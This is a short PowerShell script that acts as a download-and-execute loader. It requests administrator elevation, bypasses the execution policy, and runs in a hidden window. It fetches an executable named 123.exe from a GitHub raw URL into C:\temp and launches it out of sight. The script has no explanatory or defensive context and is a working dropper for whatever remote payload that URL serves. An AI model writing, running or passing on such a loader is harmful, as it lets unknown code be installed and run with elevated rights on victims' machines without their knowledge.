function Run-ElevatedScript {
    param(
        [Parameter(Mandatory=$true)]
        [ScriptBlock]
        $ScriptBlock
    )

    Start-Process PowerShell -Verb runas -ArgumentList "-ExecutionPolicy Bypass", "-WindowStyle Hidden", $ScriptBlock
}

$scriptBlock = {
    $url = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe'
    $downloadPath = 'C:\temp\123.exe'

    try {
        Write-Host "Downloading file..."
        Invoke-WebRequest -Uri $url -OutFile $downloadPath

        Write-Host "Executing file..."
        Start-Process $downloadPath -WindowStyle Hidden
    } catch {
        Write-Warning "An error occurred: $($_.Exception.Message)"
    }
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Run-ElevatedScript -ScriptBlock $scriptBlock
} else {
    & $scriptBlock
}
